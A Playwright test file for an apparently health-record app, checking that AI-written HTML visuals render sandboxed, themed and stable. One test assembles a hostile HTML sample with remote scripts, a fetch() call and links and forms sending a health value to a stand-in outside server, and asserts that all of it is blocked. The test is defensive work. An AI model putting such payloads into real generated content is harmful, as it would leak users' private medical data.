// A reply's visual (ADR 0034), on the real core with its real headers: the
// AI's HTML in a `rufi-visual` block draws in its locked frame, in Rufi's
// theme and at its own height, waits while its block is written and never
// reloads as the reply goes on; it runs no script of its own and reaches
// neither the network nor Rufi's page; one that tries says part of it didn't
// load; and one that starts above what you read and grows keeps your place.
import { AxeBuilder } from "@axe-core/playwright";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import type { Frame, Locator, Page } from "@playwright/test";
import { expect, openSettings, test, type Rufi } from "./rufi.ts";

// The CSP's refusals in Rufi's own page.
test.beforeEach(async ({ context }) => {
  await context.addInitScript(() => {
    const refused: string[] = [];
    Object.assign(globalThis, { refused });
    (globalThis as unknown as EventTarget).addEventListener(
      "securitypolicyviolation",
      (event) => {
        const { violatedDirective, blockedURI } = event as Event & {
          violatedDirective: string;
          blockedURI: string;
        };
        refused.push(`${violatedDirective} ${blockedURI}`);
      },
    );
  });
});
const refusedIn = (page: Page) =>
  page.evaluate(() => (globalThis as unknown as { refused: string[] }).refused);

const chat = (page: Page) => page.getByRole("region", { name: "Chat" });
const log = (page: Page) => chat(page).getByRole("log", { name: "Messages" });
const cards = (page: Page) =>
  log(page).locator(".reply iframe[title='Visual']");

async function opened(
  page: Page,
  rufi: Rufi,
  options?: Parameters<Rufi["start"]>[0],
) {
  await rufi.family();
  await rufi.start(options);
  await page.goto(rufi.link());
  await expect(
    page.getByRole("heading", { name: "Health record" }),
  ).toBeVisible();
}

/** Sends a message; the scripted Codex answers "ok:" and the message. */
async function send(page: Page, text: string) {
  const opener = chat(page).getByRole("button", { name: "Open the chat" });
  const box = chat(page).getByRole("textbox", { name: "Message to Rufi" });
  await expect(opener.or(box).first()).toBeVisible();
  if (await opener.isVisible()) await opener.click();
  await box.fill(text);
  await box.press("Enter");
  await expect(box).toHaveValue("");
}

/** A reply with `html` as its visual, between two lines of text. */
const withVisual = (html: string, after = "As your record keeps it.") =>
  `Your HbA1c, drawn:\n\n\`\`\`rufi-visual\n${html}\n\`\`\`\n\n${after}`;

async function frameOf(card: Locator): Promise<Frame> {
  const frame = await (await card.elementHandle()).contentFrame();
  if (!frame) throw new Error("The visual has no frame.");
  return frame;
}

/** The colour Rufi's page gives `token` now, as a computed colour. */
const pageColour = (page: Page, token: string) =>
  page.evaluate((name) => {
    const probe = document.createElement("span");
    probe.style.color = `var(${name})`;
    document.body.append(probe);
    const colour = getComputedStyle(probe).color;
    probe.remove();
    return colour;
  }, token);

test("a visual draws in the reply in Rufi's theme at its own height, doesn't reload as the reply's text goes on, follows a new theme without reloading, and stays drawn once the reply ends", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi);
  const chart = [
    '<div id="chart" style="height:300px;color:var(--ink)">',
    '<svg viewBox="0 0 100 50" width="100%"><circle cx="20" cy="25" r="5" fill="var(--accent)"/></svg>',
    "</div>",
  ].join("\n");
  // The reply streams in small parts: the text after the visual goes on
  // after the visual draws, paragraph by paragraph, well before it ends.
  const more = "These are the values your record keeps. ".repeat(15);
  // A source cited before the visual, defined at the reply's end.
  const after = `${more}halfway.\n\n${more}trickle end.\n\n[lab]: rufi:/documents/fictional-doc`;
  await send(
    page,
    withVisual(chart, after).replace(
      "Your HbA1c, drawn:",
      "Your HbA1c, drawn ([Sunrise Labs][lab]):",
    ),
  );
  const card = cards(page);
  const inside = page.frameLocator(".reply iframe[title='Visual']");
  await expect(inside.locator("circle")).toBeVisible({ timeout: 15_000 });
  // When the visual's document began: the same while it isn't reloaded.
  const began = async () =>
    (await frameOf(card)).evaluate(() => performance.timeOrigin);
  const loaded = await began();
  await expect(log(page).locator(".reply").getByText("halfway.")).toBeVisible();
  expect(await began()).toBe(loaded);
  // Once the reply ends, the visual is still drawn: its line may move in
  // the chat, and a frame the browser loads again gets it again.
  await expect(
    log(page).locator(".reply").getByText("trickle end."),
  ).toBeVisible();
  await expect(log(page)).toHaveAttribute("aria-busy", "false");
  await expect(inside.locator("circle")).toBeVisible();
  const ended = await began();
  // At its own height, with nothing to scroll inside.
  await expect
    .poll(() =>
      card.evaluate((element) => element.getBoundingClientRect().height),
    )
    .toBe(300);
  // In Rufi's colours.
  const ink = async () =>
    (await frameOf(card)).evaluate(
      () => getComputedStyle(document.getElementById("chart") as Element).color,
    );
  expect(await ink()).toBe(await pageColour(page, "--ink"));
  // The block shows as the visual, not as its code.
  await expect(log(page).locator(".reply pre")).toHaveCount(0);
  await expect(
    log(page).locator(".reply").getByText("Your HbA1c, drawn"),
  ).toBeVisible();
  // The reply is one document: the source is a link.
  await expect(
    log(page).locator(".reply").getByRole("link", { name: "Sunrise Labs" }),
  ).toHaveAttribute("href", /\/documents\/fictional-doc$/);

  // Dark: the same document takes the new colours.
  const light = await ink();
  await page.evaluate(() => {
    document.documentElement.dataset["appearance"] = "dark";
  });
  await expect.poll(ink).not.toBe(light);
  expect(await ink()).toBe(await pageColour(page, "--ink"));
  expect(await began()).toBe(ended);
  expect(await card.count()).toBe(1);

  await expect(
    log(page).getByText("Part of this visual didn't load"),
  ).toHaveCount(0);
  const { violations } = await new AxeBuilder({ page }).analyze();
  expect(violations.map((violation) => violation.id)).toEqual([]);
  expect(await refusedIn(page)).toEqual([]);
});

test("a visual still being written never shows its code: paragraph by paragraph it waits, word by word it holds its place quietly", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi, {
    scenario: {
      answer: 'Here is your chart.\n\n```rufi-visual\n<p id="half">Half',
    },
  });
  await send(page, "partial");
  await expect(log(page).getByText("Here is your chart.")).toBeVisible();
  await expect(log(page).locator(".reply .visual")).toHaveCount(0);
  await expect(log(page).locator(".reply pre")).toHaveCount(0);
  await expect(log(page).getByText("Half")).toHaveCount(0);

  // Word by word, after a reload: the visual's place, quietly.
  const settings = await openSettings(page, "Chat");
  await settings.getByRole("radio", { name: "Word by word" }).check();
  await page.keyboard.press("Escape");
  await page.reload();
  const opener = chat(page).getByRole("button", { name: "Open the chat" });
  await expect(opener.or(log(page)).first()).toBeVisible();
  if (await opener.isVisible()) await opener.click();
  await expect(log(page).getByText("Here is your chart.")).toBeVisible();
  await expect(log(page).locator(".reply .visual[aria-hidden]")).toBeVisible();
  await expect(cards(page)).toHaveCount(0);
  await expect(log(page).locator(".reply pre")).toHaveCount(0);
  await expect(log(page).getByText("Half")).toHaveCount(0);
});

test("a visual runs no script of its own and reaches neither the network nor Rufi's page; one that tries says part of it didn't load", async ({
  page,
  rufi,
}) => {
  // Also in WebKit (the iPhone's engine), whose link hints connect whatever
  // a policy says.
  // Anything that reaches here got out, whatever it was.
  const reached: string[] = [];
  const outside: Server = createServer((request, response) => {
    reached.push(request.url ?? "");
    response.end("out");
  });
  // A connection counts, even one that never sends a request.
  outside.on("connection", () => reached.push("a connection"));
  await new Promise<void>((resolve) => outside.listen(0, "127.0.0.1", resolve));
  const out = `http://127.0.0.1:${String((outside.address() as AddressInfo).port)}`;
  try {
    await opened(page, rufi);
    // The page's own script, whose hash the policy allows.
    const response = await page.request.get(
      new URL("/visual-frame.html", page.url()).href,
    );
    const own = /'(sha256-[^']+)'/.exec(
      response.headers()["content-security-policy"] ?? "",
    )?.[1];
    expect(own).toBeDefined();
    const hostile = [
      '<p id="drawn">Drawn</p>',
      // As a model writes a chart: a library from a CDN, then its script.
      `<script src="${out}/chart.js"></script>`,
      // A file named by a hash the policy allows: its request would leave
      // before the file is checked.
      `<script src="${out}/values.js?hba1c=6.4" integrity="${own ?? ""}" crossorigin="anonymous"></script>`,
      `<svg><script href="${out}/drawn.js"></script></svg>`,
      `<script>document.body.dataset.ran = "yes"; fetch(${JSON.stringify(out)} + "/fetch");</script>`,
      '<img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="document.body.dataset.handler = \'yes\'">',
      `<img src="${out}/picture.png" alt="">`,
      `<link rel="stylesheet" href="${out}/style.css">`,
      `<link rel="prefetch" href="${out}/prefetch">`,
      `<link rel="preconnect" href="${out}">`,
      `<link rel="dns-prefetch" href="${out}">`,
      `<link rel="preload" as="script" href="${out}/preloaded.js" integrity="${own ?? ""}">`,
      `<object data="${out}/object"></object><embed src="${out}/embed">`,
      `<base href="${out}/">`,
      `<meta http-equiv="refresh" content="0;url=${out}/moved">`,
      `<style>@import url("${out}/imported.css"); #drawn { background: url("${out}/background.png"); }</style>`,
      `<iframe src="${out}/framed"></iframe>`,
      `<form action="${out}/form" method="post"><button id="post">Post</button></form>`,
      // Links: a visual has none. Their words stay.
      `<a href="${out}/followed" target="_top"><span id="away">Away</span></a>`,
      `<a href="${out}/values?hba1c=6.4" target="_blank"><span id="blank">View values</span></a>`,
      `<a href="/visual-frame.html?hba1c=6.4"><span id="own">Chart</span></a>`,
      `<a href="/api/people?hba1c=6.4"><span id="api">Values</span></a>`,
      `<svg width="40" height="20"><a href="${out}/drawn-link"><text id="svg-link" y="15">Dot</text></a></svg>`,
      `<img id="mapped" usemap="#map" width="20" height="20" alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw="><map name="map"><area shape="rect" coords="0,0,20,20" href="${out}/area?hba1c=6.4" target="_blank" alt="Area"></map>`,
    ].join("\n");
    // Rufi's own address, reached from the visual with a value.
    const toRufi: string[] = [];
    page.on("request", (request) => {
      const { origin, search } = new URL(request.url());
      if (origin === new URL(page.url()).origin && search.includes("hba1c=")) {
        toRufi.push(request.url());
      }
    });
    await send(page, withVisual(hostile));
    const inside = page.frameLocator(".reply iframe[title='Visual']");
    await expect(inside.getByText("Drawn")).toBeVisible();
    await expect(
      log(page).getByText("Part of this visual didn't load"),
    ).toBeVisible();

    // None of the AI's script ran, and the visual has nothing of Rufi's
    // page, session or storage.
    const frame = await frameOf(cards(page));
    expect(
      await frame.evaluate(() => {
        const tried = (what: () => unknown) => {
          try {
            return String(what());
          } catch {
            return "refused";
          }
        };
        return {
          ran: document.body.dataset["ran"] ?? "no",
          handler: document.body.dataset["handler"] ?? "no",
          page: tried(() => window.parent.document.title),
          cookie: tried(() => document.cookie),
          storage: tried(() => localStorage.length),
        };
      }),
    ).toEqual({
      ran: "no",
      handler: "no",
      page: "refused",
      cookie: "refused",
      storage: "refused",
    });
    // A form or a link in it goes nowhere: its links are words only.
    await expect(inside.locator("a, area")).toHaveCount(0);
    await inside.locator("#post").click();
    // Rufi's own addresses last: were they links, the frame would leave.
    for (const words of [
      "#away",
      "#blank",
      "#svg-link",
      "#mapped",
      "#own",
      "#api",
    ]) {
      await inside.locator(words).click();
    }

    // The second policy on its own: a script file named by a hash the first
    // allows, put in past the markup's guard, still never loads.
    await frame.evaluate(
      ({ out, own }) => {
        const file = document.createElement("script");
        file.src = `${out}/active.js?hba1c=6.4`;
        file.integrity = own;
        file.crossOrigin = "anonymous";
        document.body.append(file);
      },
      { out, own: own ?? "" },
    );
    await page.waitForTimeout(1000);

    expect(reached).toEqual([]);
    expect(toRufi).toEqual([]);
    expect(page.context().pages()).toHaveLength(1);
    await expect(
      page.getByRole("heading", { name: "Health record" }),
    ).toBeVisible();
    // Rufi's page refused only a frame's move.
    for (const refusal of await refusedIn(page)) {
      expect(refusal).toMatch(/^frame-src /);
    }
  } finally {
    outside.closeAllConnections();
    await new Promise((resolve) => outside.close(resolve));
  }
});

test("a visual that starts above what you read and grows keeps your place", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi);
  await send(page, withVisual('<div style="height:120px"></div>'));
  const card = cards(page);
  await expect
    .poll(() =>
      card.evaluate((element) => element.getBoundingClientRect().height),
    )
    .toBe(120);
  await send(
    page,
    `Further words. ${"A plain line of made-up words. ".repeat(120)}`,
  );
  const reading = log(page).locator(".reply").getByText("Further words.");
  await expect(reading).toBeVisible();

  // Read further down: the visual starts 40 px above the view, far from
  // the end. (A frame wholly out of view isn't drawn, so it reports no
  // change until it shows.)
  await card.evaluate((element) => {
    let scroller = element.parentElement;
    while (scroller && getComputedStyle(scroller).overflowY !== "auto") {
      scroller = scroller.parentElement;
    }
    if (!scroller) throw new Error("No scrolling area.");
    scroller.scrollTop +=
      element.getBoundingClientRect().top -
      scroller.getBoundingClientRect().top +
      40;
  });
  const at = () =>
    reading.evaluate((element) =>
      Math.round(element.getBoundingClientRect().top),
    );
  const before = await at();
  // The visual grows by 200 px.
  await (
    await frameOf(card)
  ).evaluate(() => {
    const more = document.createElement("div");
    more.style.height = "200px";
    document.body.append(more);
  });
  await expect
    .poll(() =>
      card.evaluate((element) => element.getBoundingClientRect().height),
    )
    .toBe(320);
  expect(await at()).toBe(before);
});
